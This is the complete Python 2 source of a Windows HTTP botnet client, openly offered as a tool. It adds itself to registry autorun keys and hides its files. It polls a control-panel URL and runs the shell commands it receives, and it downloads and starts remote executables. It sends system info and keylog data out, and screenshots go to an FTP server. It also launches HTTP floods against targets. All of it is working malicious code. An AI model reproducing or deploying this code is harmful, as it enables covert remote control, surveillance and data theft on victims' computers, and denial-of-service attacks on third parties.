# -*- coding: cp1252 -*-
# HTTP Botnet with control Panel 

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#Copyright (C) 2015  Yessou Sami


import os,urllib2,base64
import socket, sys, os,time ,random,platform ,ftplib
import win32gui, win32ui, win32con, win32api #for screenshots


def httpflood():
    ip=cmd.replace("DDOS", "")  #get ip address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip=ip.replace(" ","")
        print ip
        s.connect((ip, 80))  
        s.send("""GET /?="""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """)
        print """GET /"""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """

    except ValueError:
        print "Host seems down or some connection error trying again..."





sent="false" #send info 1 time on db
sent2="false" # send 1 time online then refresh with cmd
botName="fnzvBOT.exe"
panelUrl="http://192.168.1.50/" #your control panel IP or site
remoteExe="remote.exe" #your remote install .exe name
botN="fnzvBOT.exe" #your bot name
#your ftp details so you can save screenshots and keylogs to your server
ftpserver="ftp.server.com"
ftpuser="username"
ftppass="password"

#auto start semi workin(First lines --> WIN 8 workin WIN 10 workin) UNCOMMENT FOR WORKIN
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\'+botName+'"""')

print "added startup"

f= open("data.txt","a")# keylogger data used by external script
f.write("LOGS")
f.close()
os.popen("attrib +h data.txt") #HIDE keylogs
os.popen("attrib +h "+botN) #HIDE bot 
while True:
    
   
    cmdRqst=panelUrl+"cmd.php"   
    try:
         cmd=str(urllib2.urlopen(cmdRqst).read()) #get botnet order
         print cmd
    except:
        print "error getting orders from site"
        cmd="WAIT 10"
        print cmd
    if "EXEC" in cmd: #time to use the good old os.popen
        cleancmd=cmd.replace("EXEC ","")
        print cleancmd
        os.popen(cleancmd)
        
    if "REFRESH" in cmd : #Refresh bot list\info on controlpanel
        sent="false"
        sent2="false"
        link=panelUrl+"del.php?reset=a"
        urllib2.urlopen(link).read()
        print "DELETING LIST"
    if "BOTSONLINE" in cmd :
         print "logging"
         if sent2 == "false" :
            ipconfig=str(urllib2.urlopen(panelUrl+"myip.php").read())
            urlloggami=panelUrl+"online.php?ipconf="+base64.b64encode(ipconfig)
            urllib2.urlopen(urlloggami).read()
            sent2="true"
    if "DDOS" in cmd :   #Ddos function layer 7 http only
        os.popen("cmd.exe")
        for i in range(1, 1000):  
            try: 
                httpflood()
                print i
            except:
                print "can't do it"
        
           
    if "INSTALL" in cmd : #Remote install EXE
        try:   
            exelink=panelUrl+remoteExe
            df = urllib2.urlopen(exelink) #your site hosting with directlink .exe
            output = open(remoteExe,"wb")
            output.write(df.read()) 
            output.close()
            os.popen("attrib +h "+remoteExe) #hide the file
            os.popen("start "+remoteExe) #start the file
        except:
            print "error wait maybe wrong link or connection refused"
    if "SENDINFO" in cmd :  #BASE64ALL DATA
       if sent == "false" :
        try:
           ipconfig=str(urllib2.urlopen(panelUrl+"myip.php").read())
           sysinfo=platform.uname() #list of os info
           data =" "
           for words in sysinfo:
               data=data+" "+words
               
           getUrl=panelUrl+"send.php?ipconf="+base64.b64encode(ipconfig)+"&sys="+base64.b64encode(data)  
           urllib2.urlopen(getUrl).read()
           sent="true"
        except:
            print "error sending info.. retrying"
    if "WAIT" in cmd :
         secondi=cmd.replace("WAIT", "") 
         print "waiting "+secondi+" seconds"
         time.sleep(float(secondi))
    if "GOTO30" in cmd : 
         url=cmd.replace("GOTO30 ", "") 
         print " VISITING http://"+url+"  EVERY 30 SEC"
         try :
             cmd=urllib2.urlopen("http://"+url).read()
         except:
             print "error visiting url ...check site url must be www.example.com"
         time.sleep(30) 
    if "GOTO60" in cmd :
        try:
             url=cmd.replace("GOTO60 ", "") 
             print "VISITING http://"+url+"  EVERY 60 SEC"
             cmd=urllib2.urlopen("http://"+url).read() 
        except:
             print "error visiting url ...check site url must be www.example.com"
        time.sleep(60) 
    if "SENDLOGS" in cmd :  
         session = ftplib.FTP(ftpserver,ftpuser,ftppass)
         file = open('data.txt','rb')                  # file to send
         session.storbinary('STOR data.txt', file)     # send the file
         file.close()                                    # close file and FTP
         session.quit()
         time.sleep(60*15)
    if "SCREEN" in cmd : #there is also imagegrab or other alternatives but i use this cuz works well  
        try:
            hwin = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            hwindc = win32gui.GetWindowDC(hwin)
            srcdc = win32ui.CreateDCFromHandle(hwindc)
            memdc = srcdc.CreateCompatibleDC()
            bmp = win32ui.CreateBitmap()
            bmp.CreateCompatibleBitmap(srcdc, width, height)
            memdc.SelectObject(bmp)
            memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
            fn='screen'+str(random.randrange(99999))+'.bmp'
            bmp.SaveBitmapFile(memdc, fn)
            print "SCREENSHOTED"
            os.popen("attrib +h "+fn) # hide screen shots
            session = ftplib.FTP(ftpserver,ftpuser,ftppass)
            file = open(fn,'rb')                  # file to send
            session.storbinary('STOR '+fn, file)     # send the file
            file.close()                                    # close file and FTP
            session.quit()
            #may take some time..
            print "uploaded screen"
            os.popen("del "+fn) #Del screenshot
        except:
            print "Error uploading or screenshooting"
            





    time.sleep(5) #wait before checking other commands





